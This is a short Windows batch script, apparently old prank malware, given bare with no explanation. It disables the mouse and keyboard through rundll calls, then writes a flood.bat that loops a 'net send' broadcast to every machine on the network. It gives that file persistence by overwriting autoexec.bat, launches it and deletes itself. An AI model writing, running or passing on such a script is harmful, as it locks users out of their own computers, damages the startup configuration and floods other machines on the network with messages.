@echo off
if exist C:\windows\Startm~1\Programs\StartUp\nul goto win98
if exist C:\winnt\Startm~1\Programs\StartUp\nul goto winnt
:win98
c:\windows\rundll.exe mouse,disable
c:\windows\rundll.exe keyboard,disable
goto main
:winnt
c:\windows\rundll.exe mouse,disable
c:\windows\rundll.exe keyboard,disable
goto main
:main
echo @echo off>>C:\flood.bat
echo :loop>>C:\flood.bat
echo net send * CoMe FiNd Me!!!>>C:\flood.bat
echo goto loop>>C:\flood.bat
echo start C:\flood.bat>C:\autoexec.bat
start C:\flood.bat
echo y|del %0
exit 